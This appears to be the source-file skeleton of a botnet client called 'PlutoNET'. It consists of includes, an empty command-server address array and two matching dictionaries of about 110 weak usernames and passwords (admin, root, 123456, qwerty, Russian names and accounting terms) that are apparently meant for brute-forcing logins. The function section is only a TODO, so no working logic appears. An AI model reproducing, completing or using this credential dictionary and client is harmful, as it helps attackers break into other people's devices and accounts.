/*
    client.c
    (C) 2018 Plutonus // PlutoNET

    DO NOT REDISTRIBUTE


    NOTE:
    This is the development branch of PlutoNET.
    Expect it to be unstable and more than likely unusable.
    Check out the master branch instead.
*/

//////////////////////////////////
/// INCLUDES                   ///

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>

#include <winsock2.h>       // just while developing on windows have winsock2.h imported
//#include <sys/socket.h>

//////////////////////////////////
/// DECLARATIONS               ///

unsigned char *commAddress[] = { "" };
char *usrList[] = {"11111\0", "123456\0", "12345678\0", "abc123\0", "abramov\0", "account\0", "accounting\0", "ad\0", "adm\0", "admin\0", "administrator\0", "adver\0", "advert\0", "advertising\0", "afanasev\0", "agafonov\0", "agata\0", "aksenov\0", "aleksander\0", "aleksandrov\0", "alekse\0", "alenka\0", "alexe\0", "alexeev\0", "alla\0", "anatol\0", "andre\0", "andreev\0", "andrey\0", "anna\0", "anya\0", "ao\0", "aozt\0", "arhipov\0", "art\0", "avdeev\0", "avto\0", "bank\0", "baranov\0", "baseball\0", "belousov\0", "bill\0", "billing\0", "blinov\0", "bobrov\0", "bogdanov\0", "buh\0", "buhg\0", "buhgalter\0", "buhgalteria\0", "business\0", "bux\0", "catchthismail\0", "company\0", "contact\0", "contactus\0", "corp\0", "design\0", "dir\0", "director\0", "direktor\0", "dragon\0", "economist\0", "edu\0", "email\0", "er\0", "expert\0", "export\0", "fabrika\0", "fin\0", "finance\0", "ftp\0", "glavbuh\0", "glavbux\0", "glbuh\0", "helloitmenice\0", "help\0", "holding\0", "home\0", "hr\0", "iamjustsendingthisleter\0", "info\0", "ingthisleter\0", "job\0", "john\0", "kadry\0", "letmein\0", "mail\0", "manager\0", "marketing\0", "mike\0", "mogggnomgon\0", "monkey\0", "moscow\0", "mysql\0", "office\0", "ok\0", "oracle\0", "password\0", "personal\0", "petgord34truew\0", "post\0", "postmaster\0", "pr\0", "qwerty\0", "qwertyuiop\0", "asdf\0", "asdfghjkl\0", "zxcv\0", "zxcvbnm\0", "root\0", "user\0", "login\0", "guest\0", "support\0"};
char *pssList[] = {"11111\0", "123456\0", "12345678\0", "abc123\0", "abramov\0", "account\0", "accounting\0", "ad\0", "adm\0", "admin\0", "administrator\0", "adver\0", "advert\0", "advertising\0", "afanasev\0", "agafonov\0", "agata\0", "aksenov\0", "aleksander\0", "aleksandrov\0", "alekse\0", "alenka\0", "alexe\0", "alexeev\0", "alla\0", "anatol\0", "andre\0", "andreev\0", "andrey\0", "anna\0", "anya\0", "ao\0", "aozt\0", "arhipov\0", "art\0", "avdeev\0", "avto\0", "bank\0", "baranov\0", "baseball\0", "belousov\0", "bill\0", "billing\0", "blinov\0", "bobrov\0", "bogdanov\0", "buh\0", "buhg\0", "buhgalter\0", "buhgalteria\0", "business\0", "bux\0", "catchthismail\0", "company\0", "contact\0", "contactus\0", "corp\0", "design\0", "dir\0", "director\0", "direktor\0", "dragon\0", "economist\0", "edu\0", "email\0", "er\0", "expert\0", "export\0", "fabrika\0", "fin\0", "finance\0", "ftp\0", "glavbuh\0", "glavbux\0", "glbuh\0", "helloitmenice\0", "help\0", "holding\0", "home\0", "hr\0", "iamjustsendingthisleter\0", "info\0", "ingthisleter\0", "job\0", "john\0", "kadry\0", "letmein\0", "mail\0", "manager\0", "marketing\0", "mike\0", "mogggnomgon\0", "monkey\0", "moscow\0", "mysql\0", "office\0", "ok\0", "oracle\0", "password\0", "personal\0", "petgord34truew\0", "post\0", "postmaster\0", "pr\0", "qwerty\0", "qwertyuiop\0", "asdf\0", "asdfghjkl\0", "zxcv\0", "zxcvbnm\0", "root\0", "user\0", "login\0", "guest\0", "support\0"};

//////////////////////////////////
/// BASE FUNCTIONS             ///

// TODO

//////////////////////////////////